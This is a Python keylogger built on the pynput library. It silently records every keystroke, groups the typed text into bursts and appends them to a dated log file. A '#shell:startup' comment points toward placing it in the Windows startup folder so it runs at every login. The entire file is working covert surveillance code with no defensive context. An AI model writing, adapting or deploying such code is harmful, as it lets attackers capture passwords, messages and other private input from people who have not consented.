from pynput.keyboard import Key, Listener
import logging, threading, time

#shell:startup
log_path = "#REPLACE_WITH_LOG_PATH_HERE#"
logging.basicConfig(filename=(log_path + time.strftime("%d-%b-%Y") + ".txt"), level=logging.DEBUG, format=time.strftime("%a, %d %b %Y %H:%M:%S") + ': %(message)s')

class MThread(threading.Thread):
        def __init__(self, defaultInterval = 3):
                threading.Thread.__init__(self)
                self.delay = 1
                self.callback = None
                self.interval = defaultInterval
                self.defaultInterval = defaultInterval
        def run(self):
                self.timer()
        def setInterval(self, interval):
                self.interval = interval
        def restart(self):
                self.interval = self.defaultInterval
        def setCallback(self, callback):
                self.callback = callback
        def getInterval(self):
                return self.interval
        def timer(self):
                while self.interval:
                        time.sleep(self.delay)
                        self.interval -= 1
                if self.callback is not None:
                        self.callback()

class Clipboard:
        def __init__(self):
                self.clipboard = ""
        def add(self, key):
                if key == 'Key.backspace':
                        self.clipboard = self.clipboard[:-1]
                elif key == 'Key.space':
                        self.clipboard += ' '
                elif key == 'Key.enter':
                        self.clipboard += '\n'
                else:
                        key = self.normalize(key)
                        if key is not None:
                                self.clipboard += key
                                return True
                return False
        def normalize(self, key):
                #'\x01' is unicode
                if (len(key) and (key[0:3] != 'Key') and (key[0:3] != '\'\\x')):
                        return key[1:-1]
                return None
        def text(self):
                return self.clipboard
        def clear(self):
                self.clipboard = ""

thread = None
clipboard = Clipboard()
def logger():
        global clipboard
        logging.info(clipboard.text())
        clipboard.clear()

def on_press(key):
        global thread, clipboard
        if clipboard.add(str(key)):
                if thread is None or thread.getInterval() < 1:
                        thread = MThread()
                        thread.daemon = True
                        thread.setCallback(logger)
                        thread.start()
                else:
                        thread.restart()

with Listener(on_press=on_press) as listener:
	listener.join()
